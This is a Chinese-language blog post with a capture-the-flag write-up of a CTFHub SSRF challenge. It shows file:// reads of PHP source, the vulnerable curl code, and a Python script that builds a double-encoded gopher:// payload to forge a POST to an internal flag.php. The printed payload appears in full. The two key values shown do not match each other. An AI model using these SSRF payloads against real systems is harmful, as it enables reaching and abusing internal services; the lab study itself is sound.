+++
title = 'CTFHUB---SSRF-POST请求'
date = 2024-09-17T23:43:11+08:00
draft = false
categories = ['CS', 'sec', 'wp']
+++

## 题目

空白页面 ：
`http://challenge-27676ae19b3e5ec8.sandbox.ctfhub.com:10800/?url=_`

- hint：这次是发一个HTTP POST请求，对了，ssrf是用php的curl实现的，并且会跟踪302跳转，加油吧

---
## 分析

### 302跳转

尝试访问 index.php 页面，发现还是跳转到 /?url=_ 页面，抓包发现是一个 302 跳转。
- 初步判断存在 ssrf 漏洞
![](../../../../img/Pasted%20image%2020240917221922.png)
### file:// 读取源码

尝试访问 
```
?url=localhost/flag.php
```

发现有输入框：
![](../../../../img/Pasted%20image%2020240917222533.png)

尝试读取 index.php 和 flag.php 的源码：
```
?url=file:///var/www/html/index.php
?url=file:///var/www/html/flag.php
```

index.php
```php
error_reporting(0);

if (!isset($_REQUEST['url'])){
    header("Location: /?url=_");
    exit;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_REQUEST['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_exec($ch);
curl_close($ch);
```
- URL 空时，自动302重定向到 `Location: /?url=_`
- 否则访问 URL
- 所以可通过 `?url=localhost/flag.php` 访问到 flag.php 文件

flag.php
```php
error_reporting(0);

if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
    echo "Just View From 127.0.0.1";
    return;
}

$flag=getenv("CTFHUB");
$key = md5($flag);

if (isset($_POST["key"]) && $_POST["key"] == $key) {
    echo $flag;
    exit;
}
```
- 发现只要向 flag.php 发送一个 POST 请求就会输出flag，key的值已经在源码中给出了


### gopher 协议发送 POST

正常情况应该直接发送一个 POST 就出 flag，发了试了一下果然不行：
![](../../../../img/Pasted%20image%2020240917230306.png)
- 可能的解释是直接发送 POST 无法访问内网，没有权限，这也是 ssrf 的优势，就是要利用服务端伪造请求，权限一般高于客户端的请求，可以访问内网，这题指明是 ssrf，所以用 gopher 协议发送 POST

构造：
```bash
?url=gopher://<host>:<port>/<gopher-path>
# <gopher-path> 是 POST 包的内容
```

POST：
```
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

key=51457bb0a50c1eb2c92dcc3ec3c2cc13
```
- 在使用 Gopher协议发送 POST请求包时，`Host`、`Content-Type`和`Content-Length`请求头是必不可少的，但在 GET请求中可以没有。

之后需要进行两次 URL 编码：
- 先对整个 POST 包编码，需要注意在 HTTP 协议中，头部字段是以 `\r\n` 作为分隔的，所以第一次编码之后需要将 `%0A` (`\n`) 替换成 `%0D%0A` (`\r\n`)
- 再对完整的 payload （`gopher://<host>:<port>/<gopher-path>`）进行 URL 编码


python 脚本得到最终的 payload：
```python
import urllib.parse

payload =\
"""
POST /flag.php HTTP/1.1
Host: 127.0.0.1:80
Content-Length: 36
Content-Type: application/x-www-form-urlencoded

key=d40e836124bc67ddd5a567ec1ad22176
"""
# URL编码 unquote是解码
tmp = urllib.parse.quote(payload)
print(tmp)
# 在 HTTP 协议中，头部字段是以 \r\n 作为分隔的
new = tmp.replace('%0A','%0D%0A')
print(new)
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)
print(result)      
```

payload：
```
?url=gopher%3A//127.0.0.1%3A80/_%250D%250APOST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%252036%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250A%250D%250Akey%253Dd40e836124bc67ddd5a567ec1ad22176%250D%250A
```

flag：
![](../../../../img/Pasted%20image%2020240917233050.png)

